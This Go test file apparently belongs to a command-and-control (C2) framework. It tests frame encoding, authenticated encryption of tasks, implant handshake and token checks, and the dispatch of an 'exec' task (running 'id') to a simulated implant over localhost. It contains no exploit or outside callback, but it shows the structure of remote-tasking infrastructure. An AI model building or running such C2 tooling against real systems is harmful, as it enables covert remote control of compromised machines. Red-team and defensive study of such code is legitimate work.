package c2

import (
	"bytes"
	"context"
	"encoding/json"
	"net"
	"testing"
	"time"
)

func TestFrameRoundTrip(t *testing.T) {
	var buf bytes.Buffer
	in := &Frame{Type: MsgTask, ID: 42, Payload: []byte("payload-data")}
	if err := WriteFrame(&buf, in); err != nil {
		t.Fatalf("write: %v", err)
	}
	out, err := ReadFrame(&buf)
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	if out.Type != in.Type || out.ID != in.ID || string(out.Payload) != string(in.Payload) {
		t.Fatalf("roundtrip mismatch: %+v vs %+v", out, in)
	}
}

func TestFrameRejectsOversize(t *testing.T) {
	hdr := []byte{0xff, 0xff, 0xff, 0xff, MsgTask, 0, 0, 0, 1}
	if _, err := ReadFrame(bytes.NewReader(hdr)); err == nil {
		t.Fatal("oversize frame must be rejected")
	}
}

func TestEnvelopeSealOpenAndTamper(t *testing.T) {
	env, err := ParseKey(mustKey(t))
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	plain := []byte("hello c2")
	blob, err := env.Seal(plain)
	if err != nil {
		t.Fatalf("seal: %v", err)
	}
	got, err := env.Open(blob)
	if err != nil || string(got) != string(plain) {
		t.Fatalf("open: %q err=%v", got, err)
	}
	// 篡改一个字节必须解不开
	blob[len(blob)-1] ^= 0xff
	if _, err := env.Open(blob); err == nil {
		t.Fatal("tampered blob must fail")
	}
}

func mustKey(t *testing.T) string {
	t.Helper()
	k, err := NewKeyBase64()
	if err != nil {
		t.Fatalf("key: %v", err)
	}
	return k
}

// fakeImplant 通过真实 TCP 走一遍握手，用于验证监听器启停与会话注册。
func dialImplant(t *testing.T, addr, token, key string) net.Conn {
	t.Helper()
	conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	hb, _ := json.Marshal(HelloPayload{Token: token, Key: key, ID: "implant-1", OS: "linux", Arch: "amd64", User: "root"})
	if err := WriteFrame(conn, &Frame{Type: MsgHello, Payload: hb}); err != nil {
		t.Fatalf("hello: %v", err)
	}
	ty, _, body := readFrameTimeout(t, conn)
	if ty != MsgWelcome {
		t.Fatalf("want welcome, got type %d (%s)", ty, string(body))
	}
	return conn
}

func readFrameTimeout(t *testing.T, conn net.Conn) (byte, uint32, []byte) {
	t.Helper()
	_ = conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	f, err := ReadFrame(conn)
	if err != nil {
		t.Fatalf("read frame: %v", err)
	}
	_ = conn.SetReadDeadline(time.Time{})
	return f.Type, f.ID, f.Payload
}

func TestManagerStartHandshakeDispatchStop(t *testing.T) {
	m := NewManager("test-token")
	id, addr, err := m.Start(context.Background(), "127.0.0.1:0")
	if err != nil {
		t.Fatalf("start: %v", err)
	}
	key := mustKey(t)
	conn := dialImplant(t, addr, "test-token", key)

	// 会话注册（事件回调同步触发）。
	deadline := time.Now().Add(3 * time.Second)
	for len(m.Sessions()) == 0 {
		if time.Now().After(deadline) {
			t.Fatal("session not registered")
		}
		time.Sleep(10 * time.Millisecond)
	}
	info, ok := m.Get("implant-1")
	if !ok || info.OS != "linux" {
		t.Fatalf("session info: %+v ok=%v", info, ok)
	}

	// 植入端侧回结果：拿到任务帧后用同一信封加密回传。
	env, _ := ParseKey(key)
	go func() {
		ty, fid, body := readFrameTimeout(t, conn)
		if ty != MsgTask {
			t.Errorf("want task frame, got %d", ty)
			return
		}
		plain, err := env.Open(body)
		if err != nil {
			t.Errorf("implant open: %v", err)
			return
		}
		var task Task
		if json.Unmarshal(plain, &task) != nil || task.Kind != "exec" {
			t.Errorf("bad task: %s", string(plain))
			return
		}
		res, _ := json.Marshal(Result{TaskID: fid, ExitCode: 0, Output: "ok-from-implant"})
		blob, _ := env.Seal(res)
		_ = WriteFrame(conn, &Frame{Type: MsgResult, ID: fid, Payload: blob})
	}()
	res, err := m.Dispatch(context.Background(), "implant-1", &Task{Kind: "exec", Args: "id"}, 3*time.Second)
	if err != nil {
		t.Fatalf("dispatch: %v", err)
	}
	if res.Output != "ok-from-implant" {
		t.Fatalf("result=%+v", res)
	}

	// 停监听器：端口不再可连，会话被清空。
	m.Stop(id)
	if _, ok := m.Get("implant-1"); ok {
		t.Fatal("session should be dropped after stop")
	}
	if c, err := net.DialTimeout("tcp", addr, 300*time.Millisecond); err == nil {
		_ = c.Close()
		t.Fatal("listener should not accept connections after stop")
	}
}

func TestManagerRejectsBadToken(t *testing.T) {
	m := NewManager("right-token")
	_, addr, err := m.Start(context.Background(), "127.0.0.1:0")
	if err != nil {
		t.Fatalf("start: %v", err)
	}
	defer m.StopAll()
	conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer conn.Close()
	hb, _ := json.Marshal(HelloPayload{Token: "wrong", Key: mustKey(t), ID: "x"})
	_ = WriteFrame(conn, &Frame{Type: MsgHello, Payload: hb})
	_ = conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	if _, err := ReadFrame(conn); err == nil {
		t.Fatal("bad token must close the connection")
	}
}
